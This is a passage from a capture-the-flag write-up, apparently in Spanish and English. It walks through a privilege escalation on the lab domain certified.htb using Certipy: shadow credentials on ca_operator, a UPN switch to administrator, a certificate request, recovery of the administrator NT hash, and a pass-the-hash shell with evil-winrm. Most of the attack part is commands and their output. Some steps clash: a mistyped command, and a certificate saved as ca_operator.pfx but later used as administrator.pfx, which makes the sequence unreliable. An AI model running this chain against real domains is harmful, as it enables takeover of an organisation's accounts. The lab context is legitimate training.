### Escalada
Discovered that management_svc had GenericAll rights over ca_operator.

Usamos certipy-ad para modificar ca_operator KeyCredential:
https://github.com/ly4k/Certipy.git

```bash
certipy shadow auto -u management_svc@certified.htb -hashes $NThash -account ca_operator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c65a33ce-ffe3-98a5-446a-e044e651386b'
[*] Adding Key Credential with device ID 'c65a33ce-ffe3-98a5-446a-e044e651386b' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'c65a33ce-ffe3-98a5-446a-e044e651386b' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2

```

##### Updating UPN of ca_operator

Updated the UPN (UserPrincipalName) of ca_operator to administrator:
```bash
ertipy account update -u management_svc@certified.htb -hashes $NThash -user ca_operator  -upn administrator 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```

##### 4. Requesting Administrator Certificate
```bash
certipy req -username ca_operator@certified.htb -hashes $NThash -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v4.8.2 - by Oliver Lyak (ly4k)

/home/cher0/.local/lib/python3.12/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.20) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'ca_operator@certified.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'ca_operator.pfx'

```
##### Restoring Original UPN

Restored ca_operatorâ€™s UPN to its original value:

```
certipy account update -u management_svc@certified.htb -hashes $NThash -user ca_operator  -upn ca_operator@certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

#### Obtener el certificado de administrator
Con el certificado previamente obtenido .pfx conseguimos el hash de administrator

```
certipy auth -pfx administrator.pfx -domain certified.htb 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34

```

```bash
evil-winrm -i $IP -H 0d5b49608bbce1751f708748f67e2d34 -u administrator 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                     
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

---



